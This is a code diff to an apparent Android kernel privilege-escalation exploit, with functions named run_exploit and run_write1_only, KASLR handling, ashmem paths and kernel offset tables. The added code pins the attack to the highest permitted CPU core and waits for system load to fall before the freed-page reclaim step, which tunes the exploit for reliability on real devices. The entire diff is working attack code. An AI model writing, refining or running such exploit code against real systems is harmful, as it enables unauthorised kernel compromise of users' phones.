@@ -891,12 +891,71 @@ int run_exploit(int argc, char **argv) {
     }
   }
 
+  {
+    /* Pick the highest core in our CURRENT cpuset (Android demotes
+     * long-running background procs to 0-3 mid-run; requesting a
+     * demoted-out core gives EINVAL). Parse Cpus_allowed_list. */
+    unsigned long hi = CORE;
+    FILE *f = fopen("/proc/self/status", "r");
+    if (f) {
+      char l[256];
+      while (fgets(l, sizeof(l), f)) {
+        if (strncmp(l, "Cpus_allowed_list:", 18) == 0) {
+          char *p = l + 18;
+          unsigned long a, b;
+          while (*p) {
+            while (*p == ' ' || *p == '	') p++;
+            if (!*p) break;
+            a = strtoul(p, &p, 10);
+            b = a;
+            if (*p == '-') b = strtoul(p + 1, &p, 10);
+            if (b > hi) hi = b;
+            while (*p && *p != ' ' && *p != ',') p++;
+          }
+          break;
+        }
+      }
+      fclose(f);
+    }
+    char *cs = getenv("CORE_SEL");
+    g_core_sel = (cs && cs[0]) ? strtoul(cs, NULL, 0) : hi;
+    if (g_core_sel > hi) {
+      pr_info("CORE_SEL %lu above allowed max %lu — clamping\n", g_core_sel, hi);
+      g_core_sel = hi;
+    }
+    pr_info("pin core = %lu (CORE_SEL)\n", g_core_sel);
+  }
+  /* QUIESCE_MAX: wait (bounded) for 1-min loadavg to drop below this
+   * before the reclaim choreography — background mm-cache churn on our
+   * core buries the freed page. Default 0 = no gate. */
+  {
+    double qmax = 0;
+    char *qs = getenv("QUIESCE_MAX");
+    if (qs && qs[0])
+      qmax = strtod(qs, NULL);
+    if (qmax > 0) {
+      for (int w = 0; w < 60; w++) {
+        double lavg = 99;
+        FILE *f = fopen("/proc/loadavg", "r");
+        if (f) {
+          fscanf(f, "%lf", &lavg);
+          fclose(f);
+        }
+        if (lavg <= qmax) {
+          pr_info("QUIESCE ok loadavg=%.2f\n", lavg);
+          break;
+        }
+        usleep(500000);
+      }
+    }
+  }
+
   if (!active_offsets && select_offsets() < 0) return 1;
 
   log_startup_context();
   init_p0_profile();
   init_ashmem_path();
-  pin_to_core(CORE);
+  pin_to_core(g_core_sel);
 
   /*
    * KASLR: G06 uses perf text-base; CPH shell gets EACCES on perf_event_open
@@ -1501,7 +1560,7 @@ static int run_write1_only(void) {
   if (!active_offsets && select_offsets() < 0) return 1;
   init_p0_profile();
   init_ashmem_path();
-  pin_to_core(CORE);
+  pin_to_core(g_core_sel);
   kaslr_slide = 0;
   kaslr_base = KIMAGE_TEXT_BASE;
   kaslr_done = 1;
